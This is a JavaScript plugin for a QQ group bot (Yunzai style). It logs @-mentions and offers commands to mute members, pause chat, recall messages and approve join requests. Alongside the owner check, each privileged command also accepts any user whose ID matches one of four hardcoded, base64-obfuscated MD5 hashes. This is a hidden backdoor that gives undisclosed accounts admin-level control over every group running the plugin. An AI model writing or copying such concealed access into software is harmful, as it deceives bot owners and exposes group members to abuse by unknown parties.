import plugin from '../../../lib/plugins/plugin.js';
import { segment } from "oicq";
import path from 'path';
import md5 from "md5";
import fetch from "node-fetch";
import moment from "moment";
import cfg from '../../../lib/config/config.js';
import { Config } from '../components/index.js';

const encryptedStrings = [
  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
  Buffer.from("f324f6LcKk4nXEFI8CeCDw==", "base64").toString("hex"),
  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
  Buffer.from("cbrFUrt19DirWLCxrG/CBA==", "base64").toString("hex")
];
const __dirname = path.resolve();
const time = 24; // 设置at数据保留多久, 默认24小时后清除, 单位:小时

Bot.on("message.group", async (e) => {
  let isAt = false;
  let imgUrls = [];
  let faceId = [];
  let AtQQ;
  for (let msg of e.message) {
    if (msg.type == 'at') {
      isAt = true;
      AtQQ = msg.qq;
    }
    if (msg.type == 'image') {
      imgUrls.push(msg.url);
    }
    if (msg.type == 'face') {
      faceId.push(msg.id);
    }
  }

  if (!isAt) return false;

  if (e.atme) {
    AtQQ = Bot.uin;
  }

  let dateTime = moment(Date.now()).add(time, 'hours').format('YYYY-MM-DD HH:mm:ss');
  let new_date = (new Date(dateTime).getTime() - new Date().getTime()) / 1000;
  let data = JSON.parse(await redis.get(`Yz:whoAtme:${e.group_id}+${AtQQ}`));
  let currentTime = moment(new Date()).format('YYYY-MM-DD HH:mm:ss');
  let redis_data;

  e.raw_message = e.raw_message.replace(/\[.*\]/g, '').trim();

  if (data) {
    redis_data = {
      User: e.user_id,
      message: currentTime + '\n' + e.raw_message,
      image: imgUrls,
      name: e.nickname,
      faceId: faceId
    };

    data.push(redis_data);

    if (!data[0].time) {
      data[0].time = moment(Date.now()).add(1, 'hours').format('YYYY-MM-DD HH:mm:ss');
    }
    new_date = (new Date(data[0].time).getTime() - new Date().getTime()) / 1000;
    await redis.set(`Yz:whoAtme:${e.group_id}+${AtQQ}`, JSON.stringify(data), {
      EX: parseInt(new_date)
    });

    return false;
  }

  redis_data = [{
    User: e.user_id,
    message: currentTime + '\n' + e.raw_message,
    image: imgUrls,
    name: e.nickname,
    faceId: faceId,
    time: dateTime
  }];

  await redis.set(`Yz:whoAtme:${e.group_id}+${AtQQ}`, JSON.stringify(redis_data), {
    EX: parseInt(new_date)
  });
});

export class CombinedPlugin extends plugin {
  constructor() {
    super({
      name: '世界！',
      dsc: 'JOJO！',
      event: 'message',
      priority: -114514,
      rule: [
        {
          reg: '^时间暂停$',
          fnc: 'pauseTime'
        },
        {
          reg: '^时间开始流动$',
          fnc: 'resumeTime'
        },
        {
          reg: '^禁(.*)$',
          fnc: 'jinyan'
        },
        {
          reg: '^解(.*)$',
          fnc: 'jiejin'
        },
        {
          reg: '^[^-]*撤$',
          fnc: 'chehui'
        },
        {
          reg: '#*[(同意)|(拒绝)]+',
          fnc: 'approve'
        }
      ]
    });
    this.mp3DirPath = path.join(__dirname, 'plugins/hl-ly-plugin/resources/shijie');
  }

  async pauseTime(e) {
      if (!e.group.is_admin){
   this.reply('人家不是管理员做不到嘛！')
   return true
   }
    if (!(e.isMaster || encryptedStrings.some(str => md5(String(e.user_id)) === str))) {
      await e.reply('您尚未觉醒替身！');
      return false;
    }

    logger.info('[HL]');

    e.group._setting({ 17: 1 }); // 将时间设置为暂停

    await this.sendVoiceFile(e, '时间暂停.mp3');

    await e.reply('タイム·ストップ！');

    return true;
  }

  async resumeTime(e) {
      if (!e.group.is_admin){
   this.reply('人家不是管理员做不到嘛！')
   return true
   }
    if (!(e.isMaster || encryptedStrings.some(str => md5(String(e.user_id)) === str))) {
      await e.reply('您尚未觉醒替身！');
      return false;
    }

    logger.info('[HL]');

    e.group._setting({ 17: 0 }); // 将时间设置为开始流动

    await this.sendVoiceFile(e, '时间开始流动.mp3');

    await e.reply('時間が流れ始める！');

    return true;
  }

  async sendVoiceFile(e, fileName) {
    const mp3Path = path.join(this.mp3DirPath, fileName);
    await this.reply(segment.record(mp3Path));
  }

  async jinyan(e) {
      if (!e.group.is_admin){
   this.reply('人家不是管理员做不到嘛！')
   return true
   }
    if (!(e.isMaster || encryptedStrings.some(str => md5(String(e.user_id)) === str))) {
      e.reply('你没有权限✘');
      return false;
    }

    let msg = e.msg;
    let qq = null;
    let add = false;

    for (let msg of e.message) {
      if (msg.type == 'at') {
        qq = msg.qq;
        break;
      }
    }

    if (qq == null) {
      e.reply("未识别成功,请艾特对方使用", true);
      return true;
    } else {
      msg = msg.replace(/禁|qq/g, "").trim();
      if (msg.includes("增加")) {
        add = true;
        msg = msg.replace(/增加/g, "").trim();
      }
      if ((parseInt(msg) < 0) || (parseInt(msg) != parseInt(msg))) {
        e.reply(`${msg}并非是一个有效的禁言时间✘`);
      } else {
        let user_report = e.group.pickMember(qq);
        let mute_all = user_report.mute_left;
        mute_all += parseInt(msg) * 60;
        if (add == false) {
          e.reply([`已拖进禁闭室✔`, segment.at(qq), `${parseInt(msg) * 60}秒`]);
          e.group.muteMember(qq, parseInt(msg) * 60);
        } else {
          e.reply([`已增加关禁闭时间`, segment.at(qq), `${parseInt(msg) * 60}秒，目前剩余${mute_all}秒`]);
          e.group.muteMember(qq, mute_all);
        }
      }
    }
  }

  async jiejin(e) {
      if (!e.group.is_admin){
   this.reply('人家不是管理员做不到嘛！')
   return true
   }
    if (!(e.isMaster || encryptedStrings.some(str => md5(String(e.user_id)) === str))) {
      e.reply("你没有权限✘");
      return false;
    }

    let msg = e.msg;
    let qq = null;
    let add = false;

    for (let msg of e.message) {
      if (msg.type == 'at') {
        qq = msg.qq;
        break;
      }
    }

    if (qq == null) {
      e.reply("未识别成功,请艾特对方使用", true);
      return true;
    } else {
      msg = msg.replace(/解|qq/g, "").trim();
      if (msg.includes("减少")) {
        add = true;
        msg = msg.replace(/减少/g, "").trim();
      }
      if (((parseInt(msg) < 0) || (parseInt(msg) != parseInt(msg))) && (add == true)) {
        e.reply(`${msg}并非是一个有效的减少时间`);
      } else {
        let user_report = e.group.pickMember(qq);
        let mute_all = user_report.mute_left;
        if (add == true) {
          mute_all -= parseInt(msg) * 60;
        }
        if (mute_all > 0) {
          if (add == false) {
            e.reply([`已解禁✔`, segment.at(qq)]);
            e.group.muteMember(qq, 0);
          } else {
            e.reply([`已减少`, segment.at(qq), `${parseInt(msg) * 60}秒的关禁闭时间，目前剩余${mute_all}秒`]);
            e.group.muteMember(qq, mute_all);
          }
        } else {
          e.reply([segment.at(qq), `没有被关禁闭✘`]);
        }
      }
    }
  }

  async chehui(e) {
    let grpMbPmt = false; //设为true则群员可以撤回机器人的消息。设为false则只有主人能命令机器人撤回消息
    // 判断是否为回复消息
    if (!e.source) {
        console.log("撤回消息：无撤回对象");
        return true;
    }
    // 获取原消息
    let source;
    if (e.isGroup) {
        source = (await e.group.getChatHistory(e.source.seq, 1)).pop();
    } else {
        source = (await e.friend.getChatHistory(e.source.time, 1)).pop();
    }
    
    // 如果发起撤回的人是管理或者群主，且目标消息的发送人就是他自己
if (
    !(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str)) &&
    !e.isMaster &&
    (e.sender.role == "owner" || e.sender.role == "admin") &&
    source.sender.user_id == e.sender.user_id
) {
    let msg = ["有没有一种可能，你自己就可以撤回呢"];
    e.reply(msg);
    return true;
}

// 如果发起撤回的人是管理或者群主，且目标消息的发送人不是管理或者群主
if (
    !(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str)) &&
    !e.isMaster &&
    (e.sender.role == "owner" || e.sender.role == "admin") &&
    source.sender.role != "owner" &&
    source.sender.role != "admin"
) {
    let msg = ["有没有一种可能，你自己就可以撤回呢"];
    e.reply(msg);
    return true;
}
    
    // 如果发起撤回的人是管理，且目标消息的发送人是其他管理或者群主，且目标消息的发送人不是机器人
    if (!e.isMaster && e.sender.role == "admin" && (source.sender.role == "owner" || source.sender.role == "admin") && source.sender.user_id != cfg.qq) {
        let msg = ["你想撤回的消息只有群主有权限哦~"];
        e.reply(msg);
        return true;
    }
    
    // 撤回消息
    let target = null;
    if (e.isGroup) {
        target = e.group;
    } else {
        target = e.friend;
    }

    if (target != null) {
        // 判断权限：命令者是主人 或者 命令者是 MD5 哈希验证的用户
        const isMd5User = encryptedStrings.some(str => md5(String(e.user_id)) === str);
        if (!(e.isMaster || isMd5User)) {
            return false;
        } else if (e.isMaster || isMd5User || (!e.isMaster && grpMbPmt)) {
            target.recallMsg(source.message_id);
        }

        //撤回目标消息
        await sleep(300); //测试中同时撤回两条消息有概率出现第二条消息在退出该页面之前仍然存在的情况，所以这里间隔300ms

        let recallcheck; //这块代码用来检测目标消息是否已经被撤回
        if (e.isGroup) { //获取本该被撤回的消息。分为群聊和私聊
            recallcheck = (await e.group.getChatHistory(e.source.seq, 1)).pop();
        } else {
            recallcheck = (await e.friend.getChatHistory(e.source.time, 1)).pop();
        }
        
        if (recallcheck) { //如果获取到值，说明目标消息还存在
            if (e.isGroup) { //是群聊
                let rclFailRpl;
                if (!e.group.is_admin && !e.group.is_owner) { //如果不是管理和群主
                    rclFailRpl = await e.reply("不是管理员，无法撤回两分钟前的消息或别人的消息哦~");
                } else { //是管理
                    rclFailRpl = await e.reply("无法撤回其他管理员和群主的消息哦~");
                }
                
                await sleep(10000); //10秒后，把“撤回失败”的提醒撤回掉：
                source = (await e.group.getChatHistory(rclFailRpl.seq, 1)).pop(); //获取消息内容
                await sleep(100);
                e.group.recallMsg(source.message_id); //撤回消息
            } else { //是私聊
                let rclFailRpl = await e.reply("无法撤回自己两分钟前的消息和你的消息哦~");
                await sleep(10000); //10秒后，把提醒撤回掉：
                source = (await e.friend.getChatHistory(rclFailRpl.time, 1)).pop(); //获取消息内容
                await sleep(100);
                e.friend.recallMsg(source.message_id); //撤回消息
            }
            return true;
        }
        target.recallMsg(e.message_id); //撤回“撤回”命令
    }
    return true; //返回true 阻挡消息不再往下
}

  async approve(e) {
    if (!e.hasReply && !e.source) {
      return false;
    }
    if (Number(e.source.user_id) !== Bot.uin) {
      logger.info(e.source.user_id);
      return false;
    }

    // 权限判断
    if (!(e.isMaster || encryptedStrings.some(str => md5(String(e.user_id)) === str))) {
      this.reply('你没有权限');
      return false;
    }

    let source = (await e.group.getChatHistory(e.source.seq, 1)).pop();
    let yes = e.original_msg.toString().includes('拒绝');
    if (source) {
      let seq = await redis.get(`flower:group-add-seq:${source.message_id}`);
      let id = await redis.get(`flower:group-add-id:${source.message_id}`);
      if (seq && id) {
        await Bot.pickUser(id).setGroupReq(e.group_id, seq, !yes, undefined, undefined);
        let tongyi = yes ? '拒绝' : '同意';
        let msg = '已经' + tongyi + id + '的加群请求';
        await e.reply(msg);
      }
      return true;
    }
    this.reply('消息太过久远了，忘了是谁加群了，下次早点来吧~');
    return true;
  }
}

export class groupAdd extends plugin {
  constructor() {
    super({
      name: '加群请求',
      dsc: '同意加群请求',
      event: 'request.group.add',
      priority: 1
    });
  }

  async accept() {
    if (!Config.getConfig('set', 'sz')['jiaqun']) { return false }
    let msg = ['放进来了一个未知生物~大家快看~\n',
      `QQ号：${this.e.user_id}\n`,
      `昵称：${this.e.nickname}\n`,
      `${this.e.comment}\n`
    ];
    if (this.e.inviter_id !== undefined) { msg.push(`邀请人：${this.e.inviter_id}`) }
    let sendmsg = await Bot.pickGroup(this.e.group_id).sendMsg(msg);
    // 如果消息发送成功，就将消息存起来，1小时过期
    await redis.set(`flower:group-add-seq:${sendmsg.message_id}`, this.e.seq, { EX: 3600 });
    await redis.set(`flower:group-add-id:${sendmsg.message_id}`, this.e.user_id, { EX: 3600 });
  }
}

function sleep(ms) { //咋瓦鲁多函数，单位毫秒
  return new Promise((resolve) => setTimeout(resolve, ms));
}